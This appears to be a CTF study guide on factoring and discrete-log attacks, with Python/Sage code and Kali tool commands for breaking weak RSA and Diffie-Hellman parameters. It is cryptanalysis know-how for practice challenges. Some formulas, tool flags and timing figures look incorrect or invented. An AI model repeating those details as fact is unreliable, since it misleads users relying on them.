**Core Concept**: Systematically test potential divisors starting from 2, incrementing through odd numbers (after handling 2) until finding factors or reaching √n.

**Implementation Strategy**:

```bash
# Basic Python implementation
def trial_division(n):
    factors = []
    # Handle 2 separately
    while n % 2 == 0:
        factors.append(2)
        n //= 2
    # Test odd divisors
    i = 3
    while i * i <= n:
        while n % i == 0:
            factors.append(i)
            n //= i
        i += 2
    if n > 1:
        factors.append(n)
    return factors
```

**Kali Linux Tools**:

```bash
# Factor utility (coreutils)
factor 123456789
# Output: 123456789: 3 3 3607 3803

# Using Python with gmpy2
python3 -c "import gmpy2; print(gmpy2.factor(123456789))"

# Msieve with trial division only
msieve -v -t 10 123456789
```

**Optimization Techniques**:

- **Wheel factorization**: Skip multiples of small primes (2,3,5) using modular patterns
- **Batch GCD**: When factoring multiple numbers, compute GCD(n, ∏(primes)) for batch checking
- **Sieve preprocessing**: Generate prime list via Sieve of Eratosthenes up to reasonable bound

**CTF Application Scenarios**:

- RSA challenges with intentionally weak factors (n < 10^15)
- Identifying small prime factors before switching to advanced methods
- Quick sanity checks on composite numbers
- Challenges involving smooth numbers (products of small primes)

**Practical Limits**:

- Effective up to ~12-16 digit numbers on modern hardware
- Beyond 10^15, transition to Pollard's Rho or ECM
- [Inference] For CTF RSA moduli (typically 512-4096 bits), trial division should only test up to ~10^9 before switching methods

**Command Reference**:

```bash
# factordb-pycli (query factordb.com)
pip3 install factordb-pycli
python3 -c "from factordb.factordb import FactorDB; f=FactorDB(123456789); f.connect(); print(f.get_factor_list())"

# Custom trial division with timeout
timeout 30s python3 -c "
import sys
def factor(n):
    i = 2
    while i*i <= n:
        if n % i == 0:
            print(i)
            n //= i
            continue
        i += 1
    print(n)
factor(int(sys.argv[1]))
" 123456789
```

### Pollard's Rho

Pollard's Rho algorithm uses pseudo-random number generation and cycle detection to find non-trivial factors, achieving expected complexity O(√p) for smallest prime factor p. The method excels at extracting medium-sized factors (20-50 bits) from larger composites.

**Algorithm Foundation**: The method iterates a polynomial function f(x) = x² + c (mod n), detecting cycles via Floyd's cycle-finding algorithm. When two sequence values become congruent modulo an unknown factor, their difference shares that factor with n.

**Core Implementation**:

```python
import math

def pollard_rho(n, c=1):
    if n % 2 == 0:
        return 2
    
    x, y, d = 2, 2, 1
    f = lambda x: (x**2 + c) % n
    
    while d == 1:
        x = f(x)
        y = f(f(y))
        d = math.gcd(abs(x - y), n)
    
    return d if d != n else None
```

**Kali Linux Toolchain**:

```bash
# msieve (optimized C implementation)
msieve -v 12345678901234567
# Automatically applies Pollard's Rho before QS

# SageMath implementation
sage -c "factor(12345678901234567)"

# Python with sympy
python3 -c "from sympy import factorint; print(factorint(12345678901234567))"

# YAFU (Yet Another Factoring Utility)
yafu "factor(12345678901234567)" -v
```

**Advanced Techniques**:

**Brent's Variant** (faster cycle detection):

```python
def pollard_rho_brent(n, c=1):
    if n % 2 == 0:
        return 2
    
    y, r, q = 2, 1, 1
    f = lambda x: (x**2 + c) % n
    
    while True:
        x = y
        for _ in range(r):
            y = f(y)
        
        k = 0
        while k < r and gcd(q, n) == 1:
            ys = y
            for _ in range(min(128, r - k)):
                y = f(y)
                q = (q * abs(x - y)) % n
            g = gcd(q, n)
            k += 128
        
        r *= 2
        if g > 1:
            return g if g != n else None
```

**Parameter Optimization**:

- Default c=1 works for most cases
- If no factor found, retry with c ∈ {2, 3, 5, 7...}
- [Unverified] Some sources suggest c=n-1 for specific composite structures

**Parallel Pollard's Rho**:

```bash
# YAFU multi-threaded
yafu "factor(12345678901234567)" -threads 4

# Custom parallel Python
python3 parallel_rho.py 12345678901234567 --workers 8
```

**CTF Scenarios**:

- RSA with one small prime factor (p < 2^40, q > 2^512)
- Factoring discrete log subgroups
- Breaking weak key generation (predictable factor patterns)
- Time-constrained challenges requiring fast medium-factor extraction

**Performance Benchmarks** [Inference]:

- 30-bit factors: ~0.1 seconds
- 40-bit factors: ~2 seconds
- 50-bit factors: ~30 seconds
- 60-bit factors: ~10 minutes (consider switching to ECM)

**Troubleshooting**:

```bash
# If Pollard's Rho fails (returns n or None)
# 1. Try different c values
for c in {1..10}; do
    python3 -c "from sympy.ntheory import pollard_rho; print(pollard_rho($TARGET, $c))"
done

# 2. Apply trial division first
python3 -c "
from sympy import pollard_rho, primefactors
n = $TARGET
for p in primefactors(n):
    if p > 10**6:
        print(f'Remaining: {n//p}')
"

# 3. Switch to ECM for larger factors
ecm 1000000 < input.txt  # 1M curves, B1=1000000
```

### Pollard's p-1

Pollard's p-1 algorithm exploits smooth orders in multiplicative groups, efficiently factoring n when p-1 is smooth (composed of small primes) for some prime factor p of n. This method dominates CTF challenges involving specially constructed weak RSA keys.

**Mathematical Foundation**: If p divides n and p-1 is B-smooth (all prime factors ≤ B), then for M = lcm(1,2,...,B):

- a^M ≡ 1 (mod p) by Fermat's Little Theorem
- gcd(a^M - 1, n) reveals factor p

**Stage 1 Implementation**:

```python
import math

def pollard_pm1_stage1(n, B1=10**6, a=2):
    """
    Stage 1: Handle prime powers up to B1
    """
    m = a
    for p in primes_up_to(B1):
        # Exponent for prime power bound
        pe = p
        while pe <= B1:
            m = pow(m, p, n)
            pe *= p
    
    g = math.gcd(m - 1, n)
    return g if 1 < g < n else None

def primes_up_to(B):
    """Sieve of Eratosthenes"""
    sieve = [True] * (B + 1)
    sieve[0] = sieve[1] = False
    for i in range(2, int(B**0.5) + 1):
        if sieve[i]:
            sieve[i*i::i] = [False] * len(sieve[i*i::i])
    return [i for i, is_prime in enumerate(sieve) if is_prime]
```

**Stage 2 Enhancement**:

```python
def pollard_pm1_stage2(n, stage1_result, B1, B2=10**7, a=2):
    """
    Stage 2: Handle primes in (B1, B2]
    Uses baby-step giant-step optimization
    """
    if stage1_result:
        return stage1_result
    
    # Stage 1 base value
    m = pow(a, math.prod(primes_up_to(B1)), n)
    
    # Stage 2 prime gaps
    primes_b2 = [p for p in primes_up_to(B2) if p > B1]
    
    for p in primes_b2:
        m = pow(m, p, n)
        g = math.gcd(m - 1, n)
        if 1 < g < n:
            return g
    
    return None
```

**Kali Linux Tools**:

```bash
# GMP-ECM (includes p-1)
ecm -pm1 1e6 < number.txt
# B1=10^6, automatic B2

ecm -pm1 1e6 1e8 < number.txt  
# B1=10^6, B2=10^8 explicit

# YAFU with p-1
yafu "pm1(12345678901234567)" -B1pm1 1000000

# Msieve (automatic method selection)
msieve -v 12345678901234567
```

**Parameter Selection Strategy**:

**Bound Selection** [Inference]:

```
Small factors (< 40 bits):   B1 = 10^6,  B2 = 10^8
Medium factors (40-60 bits):  B1 = 10^7,  B2 = 10^9  
Large factors (> 60 bits):    B1 = 10^8,  B2 = 10^10
```

**Base Selection**:

- Default a=2 works for most cases
- If failed, try a ∈ {3, 5, 7, 11}
- Avoid a where gcd(a, n) > 1

**CTF-Specific Applications**:

**Intentionally Weak RSA Keys**:

```python
# Common CTF pattern: p-1 has small factors only
# Example: p = 2^a * 3^b * 5^c * ... + 1

# Quick check for smoothness
def is_smooth(n, B):
    for p in primes_up_to(B):
        while n % p == 0:
            n //= p
    return n == 1

# Test if p-1 is likely smooth
import gmpy2
def check_pm1_vulnerable(n, B1=10**6):
    # Trial division to get small factors first
    for p in primes_up_to(1000):
        if n % p == 0:
            q = n // p
            # Check if p-1 or q-1 is smooth
            return is_smooth(p-1, B1) or is_smooth(q-1, B1)
```

**Batch Processing**:

```bash
# Process multiple candidates
for num in $(cat candidates.txt); do
    echo $num | ecm -pm1 1e7 1e9 >> results.txt 2>&1
done

# Parallel processing with GNU parallel
cat candidates.txt | parallel -j8 "echo {} | ecm -pm1 1e6 2>&1 | grep -i found"
```

**Williams' p+1 Variant**:

```bash
# When p-1 isn't smooth, try p+1
ecm -pp1 1e6 < number.txt

# YAFU pp1
yafu "pp1(12345678901234567)" -B1pp1 1000000
```

**Optimization Techniques**:

**FFT-based Exponentiation**:

```bash
# GMP-ECM automatically uses FFT for large exponents
ecm -v -pm1 1e8 < large_number.txt
# Monitor FFT usage in verbose output
```

**Checkpoint/Resume**:

```bash
# For long-running factorizations
ecm -pm1 -save checkpoint.txt 1e8 < number.txt
# Resume from checkpoint
ecm -pm1 -resume checkpoint.txt 1e8 < number.txt
```

**Success Indicators** [Inference]:

- Very fast termination (< 1 second): Likely found small smooth factor
- Slow Stage 1: Normal for large B1
- Stage 2 reached: p-1 may have larger prime factors
- Failure after both stages: p-1 not smooth up to B2

**Common CTF Pitfalls**:

- Insufficient B1/B2 bounds for challenge difficulty
- Not trying Williams' p+1 after p-1 failure
- Forgetting to test multiple base values
- Assuming failure means non-factorability (may need different method)

### Quadratic Sieve

The Quadratic Sieve (QS) is the fastest general-purpose factorization algorithm for integers below ~100 decimal digits, using smooth number generation and linear algebra over GF(2). QS dominates modern CTF challenges involving strong RSA keys in the 512-1024 bit range.

**Algorithm Overview**:

1. **Sieving Phase**: Find relations where Q(x) = (x + ⌊√n⌋)² - n factors completely over factor base
2. **Linear Algebra**: Find subset of relations whose product is a perfect square
3. **Factor Extraction**: Compute gcd((x² - y²)/2, n) to extract factors

**Kali Linux Implementation**:

```bash
# Msieve (recommended for CTF)
msieve -v 123456789012345678901234567
# Automatic parameter selection, multi-threaded

msieve -v -t 8 123456789012345678901234567
# 8 threads explicit

# YAFU (wrapper for msieve/GGNFS)
yafu "factor(123456789012345678901234567)" -threads 4
# Automatically selects QS for appropriate sizes

# CADO-NFS (includes QS implementation)
cado-nfs.py 123456789012345678901234567
```

**Parameter Configuration**:

**Factor Base Selection**:

```bash
# Msieve automatic selection [Inference]:
# 60-digit: ~50,000 primes
# 80-digit: ~500,000 primes  
# 100-digit: ~3,000,000 primes

# Manual factor base (advanced)
msieve -v -fb 500000 123456789012345678901234567
```

**Sieve Interval**:

```bash
# Control sieving range
msieve -v -m 500000 large_number.txt
# Sieve ±500,000 around √n

# Multiple polynomial selection
msieve -v -mp 100 large_number.txt
# Use 100 different polynomials
```

**Memory Management**:

```bash
# Large memory systems
msieve -v -l memory_bound.txt 12345...
# Specify log file for checkpointing

# Distributed sieving (multiple machines)
# Machine 1:
msieve -v -s sieve_data1.dat -r 0,1000000 number.txt
# Machine 2:  
msieve -v -s sieve_data2.dat -r 1000000,2000000 number.txt
# Combine results:
cat sieve_data*.dat > combined.dat
msieve -v -nc combined.dat number.txt  # -nc: skip sieving
```

**Advanced Techniques**:

**Multiple Polynomial Quadratic Sieve (MPQS)**:

```python
# Conceptual structure (implemented in C in actual tools)
def mpqs_concept(n):
    sqrt_n = isqrt(n)
    
    # Generate multiple polynomials A(x) = ax² + bx + c
    # where A(r) ≡ 0 (mod n) for some r
    for polynomial in generate_polynomials(n):
        a, b, c = polynomial
        
        # Sieve for smooth values
        for x in sieve_range:
            Q_x = a*x*x + b*x + c
            if is_smooth(Q_x, factor_base):
                yield (x, Q_x, factor_Q_x)
```

**Self-Initializing Quadratic Sieve (SIQS)**:

```bash
# YAFU automatically uses SIQS
yafu "siqs(123456789012345678901234567)"

# Monitor polynomial generation
yafu "factor(N)" -v | grep "polynomial"
```

**Linear Algebra Phase**:

**Block Lanczos Algorithm**:

```bash
# Msieve uses block Lanczos for matrix solving
# Monitor progress in verbose mode
msieve -v -nc relations.dat number.txt 2>&1 | grep -i lanczos
# Output shows matrix dimensions and solving progress
```

**Structured Gaussian Elimination**:

```bash
# Alternative for smaller matrices
# [Unverified] Some implementations use structured Gaussian elimination for matrices < 100k x 100k
```

**CTF Optimization Strategies**:

**Quick Sizing Assessment**:

```python
import math

def estimate_qs_time(n_bits):
    """
    [Inference] Rough time estimates for modern hardware
    """
    estimates = {
        256: "< 1 minute",
        384: "< 10 minutes", 
        512: "< 2 hours",
        768: "< 2 days",
        1024: "weeks (use NFS instead)"
    }
    return estimates.get(n_bits, "uncertain")

# Check if QS is appropriate
n_bits = len(bin(your_number)) - 2
print(f"{n_bits} bits: {estimate_qs_time(n_bits)}")
```

**Parallel Multi-Machine Setup**:

```bash
#!/bin/bash
# distribute_qs.sh - Coordinate distributed sieving

TARGET="123456789012345678901234567"
MACHINES=("host1" "host2" "host3" "host4")
RANGE_SIZE=1000000

for i in "${!MACHINES[@]}"; do
    START=$((i * RANGE_SIZE))
    END=$(((i + 1) * RANGE_SIZE))
    
    ssh "${MACHINES[$i]}" "
        echo $TARGET | msieve -v -s sieve_$i.dat -r $START,$END -
    " &
done

wait

# Collect results
for i in "${!MACHINES[@]}"; do
    scp "${MACHINES[$i]}:sieve_$i.dat" .
done

# Final processing
cat sieve_*.dat > complete.dat
echo $TARGET | msieve -v -nc complete.dat -
```

**Performance Monitoring**:

```bash
# Track relations found
watch -n 5 'tail -n 20 msieve.log | grep relations'

# Estimate completion
tail -f msieve.log | grep --line-buffered "relations needed"

# Resource usage
htop -p $(pgrep msieve)
```

**Post-Sieving Optimization**:

**Relation Filtering**:

```bash
# Remove duplicate/redundant relations
msieve -v -nc1 relations.dat number.txt
# -nc1: filtering only, no matrix solving

# Check relation quality
grep "free relations" msieve.log
```

**Matrix Solving Acceleration**:

```bash
# Use GPU acceleration (if available) [Unverified]
# Some custom implementations support CUDA for block Lanczos
# This is not standard in msieve/YAFU

# Optimize threading for linear algebra
export OMP_NUM_THREADS=16
msieve -v -nc2 relations.dat number.txt
# -nc2: skip sieving and filtering, solve matrix only
```

**CTF Challenge Patterns**:

**Semi-Smooth Numbers**:

```python
# Numbers with one large and one small factor
# QS excels when smaller factor is ~30-40% of bits

def is_qs_optimal(n):
    """Check if n is good candidate for QS"""
    bit_length = n.bit_length()
    
    # QS optimal range [Inference]
    if 256 <= bit_length <= 768:
        return True
    
    # Above 768 bits, consider NFS
    return False
```

**Batch Factorization**:

```bash
# Factor multiple challenges efficiently
cat challenge_numbers.txt | while read num; do
    echo "Factoring $num"
    echo $num | timeout 3600 msieve -v -t 8 - >> results.txt 2>&1
    echo "---" >> results.txt
done
```

**Troubleshooting Common Issues**:

**Insufficient Relations**:

```bash
# Increase sieve size
msieve -v -m 2000000 stuck_number.txt

# Use more polynomials  
msieve -v -mp 500 stuck_number.txt
```

**Matrix Solving Failure**:

```bash
# Restart with more relations (oversieving)
msieve -v -e 1.05 number.txt
# Collect 5% extra relations

# Force matrix rebuild
rm msieve.dat.mat*
msieve -v -nc relations.dat number.txt
```

**Memory Exhaustion**:

```bash
# Reduce memory footprint
ulimit -v 8388608  # Limit to 8GB
msieve -v number.txt

# Use disk-based matrix storage [Inference]
# Some implementations support out-of-core solving for huge matrices
```

**Practical Time Estimates** [Inference based on common benchmarks]:

```
Bits | Typical Time (8 cores, modern CPU)
-----|-----------------------------------
256  | 30 seconds - 2 minutes
384  | 5-15 minutes
512  | 1-3 hours  
640  | 12-36 hours
768  | 3-10 days
```

**When to Switch to Number Field Sieve**:

- n > 100 decimal digits (~332 bits)
- QS showing slow progress after several hours
- Available computational resources support distributed NFS
- Challenge hints at GNFS-level difficulty
### General Number Field Sieve (GNFS)

The General Number Field Sieve is the asymptotically fastest known algorithm for factoring large integers (>100 digits). In CTF contexts, GNFS is rarely used directly due to computational requirements, but understanding when to identify GNFS-appropriate scenarios is critical.

**When GNFS Applies:**

- RSA moduli > 100 digits where other methods fail
- Composite numbers without small factors
- Numbers not vulnerable to special-form factorization (Fermat, Pollard p-1)

**Tool Implementation:**

```bash
# CADO-NFS - most accessible GNFS implementation
git clone https://gitlab.inria.fr/cado-nfs/cado-nfs.git
cd cado-nfs
make

# Factor a number (creates parameter file automatically)
./cado-nfs.py 1234567890123456789012345678901234567

# Manual parameter specification for larger numbers
./cado-nfs.py -t 4 --tasks.threads=2 <number>
```

**GGNFS (alternative implementation):**

```bash
# Available via package managers on Kali
apt-get install ggnfs

# Factor using GGNFS
factmsieve.py <number>
```

**Practical CTF Considerations:**

- GNFS requires hours to weeks for 120+ digit numbers
- Most CTF challenges timing out with GNFS indicate wrong approach
- [Inference] If a challenge provides a 150+ digit RSA modulus with no other vulnerabilities, it likely expects precomputed factorization databases or a mathematical shortcut

**Recognition Pattern:**

```python
# Check if GNFS might be needed
from Crypto.Util.number import *

n = <target_modulus>
bit_length = n.bit_length()

if bit_length > 330:  # ~100 decimal digits
    print("[Inference] GNFS territory - verify no other vulnerabilities exist")
```

### Baby-step Giant-step

Baby-step Giant-step (BSGS) solves the discrete logarithm problem: given g^x ≡ h (mod p), find x. Time complexity O(√n), space complexity O(√n).

**Algorithm Mechanics:**

For g^x ≡ h (mod p), with x ∈ [0, n-1]:

1. Choose m = ⌈√n⌉
2. **Baby step:** Compute table {(j, g^j mod p) : j ∈ [0, m-1]}
3. Compute c = (g^(-m)) mod p
4. **Giant step:** For i = 0 to m-1, check if h·c^i is in baby-step table
5. If match at (i, j): x = im + j

**Pure Python Implementation:**

```python
def baby_giant(g, h, p, order=None):
    """
    Solve g^x = h (mod p)
    order: optional group order (defaults to p-1)
    """
    import math
    from collections import defaultdict
    
    if order is None:
        order = p - 1
    
    m = int(math.ceil(math.sqrt(order)))
    
    # Baby step: build table
    baby_table = {}
    power = 1
    for j in range(m):
        baby_table[power] = j
        power = (power * g) % p
    
    # Giant step: search
    c = pow(g, -m, p)  # g^(-m) mod p
    gamma = h
    
    for i in range(m):
        if gamma in baby_table:
            return i * m + baby_table[gamma]
        gamma = (gamma * c) % p
    
    return None  # No solution found

# Example usage
p = 1019  # prime
g = 2
h = 5
x = baby_giant(g, h, p)
print(f"Discrete log: {x}")
# Verify: pow(g, x, p) should equal h
```

**SageMath Implementation (Optimized):**

```python
# SageMath has built-in BSGS
p = 1019
g = Mod(2, p)
h = Mod(5, p)

x = discrete_log(h, g)  # Uses BSGS internally for appropriate sizes
print(x)

# Manual BSGS with order specification
F = GF(p)
g_elem = F(2)
h_elem = F(5)
x = discrete_log(h_elem, g_elem, ord=p-1, operation='*')
```

**CTF Tool Usage:**

```bash
# Using msieve for discrete log (limited support)
# More commonly use SageMath or custom scripts

# For very small logs, use online calculators
# https://www.alpertron.com.ar/DILOG.HTM
```

**Optimization Variants:**

```python
# Pollard's Kangaroo (better space complexity)
# Use when memory is constrained
from sage.all import *

def pollard_kangaroo(g, h, p, a, b):
    """
    Find x where g^x = h (mod p), with a <= x <= b
    Better space complexity than BSGS: O(1) vs O(√n)
    """
    # SageMath implementation
    F = GF(p)
    return discrete_log(F(h), F(g), bounds=(a, b))

# Example: DLP in subgroup
p = next_prime(2^256)
g = Mod(2, p)
h = g^12345
x = discrete_log(h, g)  # SageMath chooses algorithm
```

**CTF Recognition Patterns:**

```python
# Scenario 1: Small modulus (direct BSGS)
if p < 2**40:
    # BSGS feasible
    x = baby_giant(g, h, p)

# Scenario 2: Known subgroup order
# Common in Diffie-Hellman challenges
p = 2*q + 1  # Sophie Germain prime
# Work in subgroup of order q
x = baby_giant(g, h, p, order=q)

# Scenario 3: Pohlig-Hellman reduction needed
# If p-1 has small factors, combine with BSGS
```

### Pollard's Lambda (Rho for Logarithms)

Pollard's Lambda method (also called Rho for discrete logs) solves DLP with O(√n) time but O(1) space. Particularly effective when x is known to lie in a specific interval [a, b].

**Algorithm Overview:**

Two variants:

1. **Lambda method:** Known interval [a, b]
2. **Rho method:** Unknown interval

**Lambda Method Implementation:**

```python
def pollard_lambda(g, h, p, a, b):
    """
    Solve g^x = h (mod p) where a <= x <= b
    Uses distinguished points optimization
    """
    import random
    
    N = b - a
    # Pseudorandom function for jumps
    def f(y, n):
        # Use a simple hash-based partition
        k = y % 20  # Partition space
        return (y * pow(g, 2**k, p)) % p, n + 2**k
    
    # Tame kangaroo
    xT = 0
    yT = pow(g, b, p)
    for _ in range(int(1.5 * N**0.5)):
        yT, xT = f(yT, xT)
    
    # Wild kangaroo
    xW = 0
    yW = h
    while xW < b - a + xT:
        yW_new, xW_new = f(yW, xW)
        if yW_new == yT:
            return b + xT - xW_new
        yW, xW = yW_new, xW_new
    
    return None

# Practical CTF usage
p = 1000000007
g = 2
secret = 123456
h = pow(g, secret, p)

# If you know x is small (common CTF scenario)
x = pollard_lambda(g, h, p, 0, 200000)
```

**SageMath Implementation:**

```python
# SageMath's discrete_log uses Pollard Rho internally for large problems
p = next_prime(2^128)
g = Mod(2, p)
x_real = 123456789
h = g^x_real

# This will use Pollard Rho automatically
x_found = discrete_log(h, g, algorithm='rho')

# Specify bounds (Lambda method)
x_found = discrete_log(h, g, bounds=(0, 10^9))
```

**Optimized Tools:**

```bash
# Using CADO-NFS discrete log tools (for large primes)
# [Unverified] - CADO-NFS discrete log module availability varies by version

# Generic sage script for CTF
cat > solve_dlog.sage << 'EOF'
p = int(input("Prime: "))
g = int(input("Generator: "))
h = int(input("Target: "))

F = GF(p)
result = discrete_log(F(h), F(g))
print(f"Discrete log: {result}")
EOF

sage solve_dlog.sage
```

**CTF-Specific Optimizations:**

```python
# Scenario: Multi-target DLP (same base, multiple targets)
def multi_target_bsgs(g, h_list, p):
    """
    Solve g^x = h_i (mod p) for multiple h_i values
    Amortizes baby-step computation
    """
    import math
    
    m = int(math.ceil(math.sqrt(p-1)))
    
    # Single baby step for all targets
    baby_table = {}
    power = 1
    for j in range(m):
        baby_table[power] = j
        power = (power * g) % p
    
    c = pow(g, -m, p)
    results = {}
    
    # Giant step for each target
    for h in h_list:
        gamma = h
        for i in range(m):
            if gamma in baby_table:
                results[h] = i * m + baby_table[gamma]
                break
            gamma = (gamma * c) % p
    
    return results
```

**Performance Comparison:**

```python
# Benchmark different methods (for documentation)
import time

def benchmark_dlog():
    p = next_prime(2^40)
    g = 2
    x = 123456789
    h = pow(g, x, p)
    
    # BSGS timing
    start = time.time()
    baby_giant(g, h, p)
    bsgs_time = time.time() - start
    
    # [Inference] Expected relative performance:
    # BSGS: O(√n) time, O(√n) space
    # Lambda: O(√n) time, O(1) space
    # Rho: O(√n) time, O(1) space (no interval knowledge)
    
    return bsgs_time
```

### Index Calculus

Index Calculus is the fastest known algorithm for discrete logarithms in finite fields (F_p^*). Time complexity: subexponential L_n[1/3]. Foundation for DLP attacks on finite field Diffie-Hellman.

**Algorithm Structure:**

1. **Factor Base Selection:** Choose B = {p_1, p_2, ..., p_k} of small primes
2. **Relation Collection:** Find relations where g^x_i factors over B
3. **Linear Algebra:** Solve system for log_g(p_i)
4. **Individual Logarithm:** Express target as product of factor base

**Python Implementation (Educational):**

```python
def index_calculus(g, h, p, B_size=None):
    """
    Solve g^x = h (mod p) using index calculus
    B_size: factor base size (auto-selected if None)
    """
    import random
    from sympy import isprime, factorint, primerange
    from sympy.matrices import Matrix
    
    # Select factor base
    if B_size is None:
        B_size = int(p**0.2)  # Heuristic
    
    factor_base = list(primerange(2, B_size))
    k = len(factor_base)
    
    print(f"[Inference] Using factor base size: {k}")
    
    # Phase 1: Collect relations
    relations = []
    exponents = []
    
    def is_smooth(n, B):
        """Check if n factors completely over B"""
        factors = factorint(n)
        return all(p in B for p in factors.keys())
    
    while len(relations) < k + 10:  # Oversample for linear independence
        x = random.randint(1, p-2)
        val = pow(g, x, p)
        
        if is_smooth(val, factor_base):
            factors = factorint(val)
            exp_vec = [factors.get(pi, 0) for pi in factor_base]
            relations.append(exp_vec)
            exponents.append(x)
    
    # Phase 2: Linear algebra (mod p-1)
    A = Matrix(relations[:k])
    b = Matrix(exponents[:k])
    
    # [Unverified] Solving over Z/(p-1)Z may require modular matrix inversion
    # Simplified: solve over integers then reduce
    try:
        logs = A.inv_mod(p-1) * b
        log_table = {factor_base[i]: int(logs[i]) % (p-1) 
                     for i in range(k)}
    except:
        return None  # Linear system singular
    
    # Phase 3: Find target logarithm
    for s in range(1, p):
        target = (h * pow(g, s, p)) % p
        if is_smooth(target, factor_base):
            factors = factorint(target)
            log_h = sum(log_table[pi] * e for pi, e in factors.items())
            return (log_h - s) % (p-1)
    
    return None

# Example usage
p = 10007  # Small prime for demonstration
g = 5
x_secret = 1234
h = pow(g, x_secret, p)

x_found = index_calculus(g, h, p)
print(f"Found: {x_found}, Expected: {x_secret}")
```

**SageMath Production Implementation:**

```python
# SageMath has optimized index calculus
from sage.all import *

p = next_prime(2^80)  # Index calculus effective for 60-100 bit primes
g = primitive_root(p)
x = 123456789
h = power_mod(g, x, p)

# Automatic algorithm selection (uses index calculus for appropriate sizes)
x_found = discrete_log(Mod(h, p), Mod(g, p))

# Force index calculus (if supported)
# [Unverified] Algorithm specification depends on SageMath version
try:
    x_found = discrete_log(Mod(h, p), Mod(g, p), algorithm='index_calculus')
except:
    pass
```

**CADO-NFS for Large-Scale DLP:**

```bash
# CADO-NFS supports discrete log for large characteristic
cd cado-nfs

# Create parameter file for DLP
cat > dlp_params << EOF
tasks.threads = 4
p = <prime_modulus>
ell = <target_order>  # Usually p-1 or subgroup order
EOF

# Run discrete log computation
./cado-nfs.py --dlp -t all dlp_params target=<target_value> base=<generator>

# [Unverified] Exact parameter syntax varies by CADO-NFS version
# Consult documentation: https://cado-nfs.gitlabpages.inria.fr/
```

**CTF-Specific Tools:**

```python
# Tool: Use msieve for small DLP (< 100 bits)
import subprocess

def msieve_dlog(g, h, p):
    """
    Wrapper for msieve discrete log
    [Unverified] msieve DLP support may be limited
    """
    # Write parameters
    with open('dlp.txt', 'w') as f:
        f.write(f"N {p}\n")
        f.write(f"BASE {g}\n")
        f.write(f"TARGET {h}\n")
    
    # Run msieve
    result = subprocess.run(['msieve', '-i', 'dlp.txt', '-l', 'dlp.log'],
                          capture_output=True, text=True)
    
    # Parse output (format varies)
    # [Inference] Implementation details depend on msieve version
    return parse_msieve_output(result.stdout)
```

**Polynomial Variant (Extension Fields):**

```python
# Index calculus in F_p^n (extension fields)
# Critical for pairing-based crypto attacks

def index_calculus_extension(g, h, q, n):
    """
    Discrete log in F_{q^n}
    Used for attacks on pairing-based cryptography
    [Inference] Implementation requires Coppersmith's algorithm
    """
    F = GF(q^n, 'a')
    g_elem = F(g)
    h_elem = F(h)
    
    # SageMath handles extension field DLP
    result = discrete_log(h_elem, g_elem)
    return result

# Example: Composite field
q = next_prime(2^16)
n = 4
F = GF(q^n, 'a')
g = F.multiplicative_generator()
x = 123456
h = g^x

x_found = discrete_log(h, g)
```

**Performance Optimization:**

```python
# Factor base selection heuristic
def optimal_factor_base_size(p):
    """
    Estimate optimal factor base for index calculus
    [Inference] Based on L_n[1/3] complexity
    """
    import math
    
    log_p = math.log(p)
    # L_p[1/3, c] = exp((c + o(1))(log p)^(1/3) (log log p)^(2/3))
    c = (64/9)**(1/3)  # Constant from complexity analysis
    
    L = math.exp(c * (log_p**(1/3)) * (math.log(log_p)**(2/3)))
    
    # Factor base size proportional to L
    B_size = int(L**0.5)
    
    return B_size

# Relation collection parallelization
def parallel_relation_search(g, p, factor_base, num_relations):
    """
    Parallel relation collection for index calculus
    """
    from multiprocessing import Pool, cpu_count
    import random
    
    def search_relations(seed):
        random.seed(seed)
        local_relations = []
        
        for _ in range(num_relations // cpu_count()):
            x = random.randint(1, p-2)
            val = pow(g, x, p)
            # Check smoothness and collect
            # [Implementation details omitted for brevity]
        
        return local_relations
    
    with Pool() as pool:
        results = pool.map(search_relations, range(cpu_count()))
    
    return [r for sublist in results for r in sublist]
```

**CTF Challenge Recognition:**

```python
# Decision tree for DLP algorithm selection
def select_dlog_algorithm(p, g, h, known_bounds=None):
    """
    Choose appropriate DLP algorithm for CTF scenario
    [Inference] Based on problem size and structure
    """
    import math
    
    log2_p = p.bit_length()
    
    if log2_p <= 30:
        return "baby_giant", "Direct BSGS feasible"
    
    elif log2_p <= 60 and known_bounds:
        return "pollard_lambda", "Bounded search with Pollard Lambda"
    
    elif log2_p <= 100:
        return "index_calculus", "Index calculus optimal range"
    
    elif is_smooth(p-1, 2**20):  # Check if p-1 has small factors
        return "pohlig_hellman", "Pohlig-Hellman reduction to smaller DLPs"
    
    else:
        return "check_vulnerability", "May need special structure or NFS"

def is_smooth(n, B):
    """Check if n is B-smooth"""
    from sympy import factorint
    factors = factorint(n)
    return max(factors.keys()) <= B if factors else False
```

**Important Considerations:**

- Index calculus **does not work** for elliptic curve DLP (requires different algorithms)
- Most effective for prime fields F_p where p is 60-120 bits
- CTF challenges with 256+ bit primes typically require finding mathematical shortcuts
- [Inference] If a CTF provides a large DLP with no apparent structure, look for weak parameters (small subgroup, special form modulus)

---

## Tools

### OpenSSL RSA Operations

**Key Generation and Manipulation**

```bash
# Generate private key (default 2048 bits)
openssl genrsa -out private.pem 2048

# Generate smaller keys for CTF (weaker, faster to attack)
openssl genrsa -out private.pem 512
openssl genrsa -out private.pem 1024

# Extract public key from private key
openssl rsa -in private.pem -pubout -out public.pem

# View private key components (n, e, d, p, q)
openssl rsa -in private.pem -text -noout

# View public key components (n, e)
openssl rsa -pubin -in public.pem -text -noout

# Convert key formats
openssl rsa -in private.pem -outform DER -out private.der
openssl rsa -in private.der -inform DER -out private.pem

# Extract modulus and exponent in hex
openssl rsa -pubin -in public.pem -modulus -noout
openssl rsa -in private.pem -text -noout | grep publicExponent
```

**Encryption and Decryption**

```bash
# Encrypt with public key (PKCS#1 v1.5 padding)
openssl rsautl -encrypt -inkey public.pem -pubin -in plaintext.txt -out ciphertext.bin

# Decrypt with private key
openssl rsautl -decrypt -inkey private.pem -in ciphertext.bin -out decrypted.txt

# Raw encryption (no padding) - useful for CTF math attacks
openssl rsautl -encrypt -inkey public.pem -pubin -in plaintext.txt -out ciphertext.bin -raw

# Sign and verify
openssl rsautl -sign -inkey private.pem -in message.txt -out signature.bin
openssl rsautl -verify -inkey public.pem -pubin -in signature.bin
```

### GPG (GNU Privacy Guard)

**Key Management**

```bash
# Generate RSA key pair interactively
gpg --full-generate-key
# Select: (1) RSA and RSA, 2048 bits (or custom), no expiration

# Generate with batch mode (non-interactive)
cat > keygen-params << EOF
Key-Type: RSA
Key-Length: 2048
Name-Real: CTF Player
Name-Email: player@ctf.local
Expire-Date: 0
%no-protection
EOF
